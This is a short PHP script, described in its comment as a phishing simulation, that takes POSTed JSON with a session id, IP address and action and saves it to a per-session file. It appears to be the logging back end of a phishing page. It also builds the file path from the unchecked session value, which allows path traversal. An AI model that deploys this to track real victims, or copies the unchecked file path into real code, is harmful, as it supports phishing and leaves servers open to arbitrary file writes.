<?php
// ⚠️ This is a phishing simulation for educational awareness only.
$data = json_decode(file_get_contents('php://input'), true);
if (!$data || !isset($data['session'], $data['ip'], $data['action'])) {
    echo json_encode(['success' => false]);
    exit;
}
file_put_contents("sessions/{$data['session']}_action.json", json_encode($data));
echo json_encode(['success' => true]);
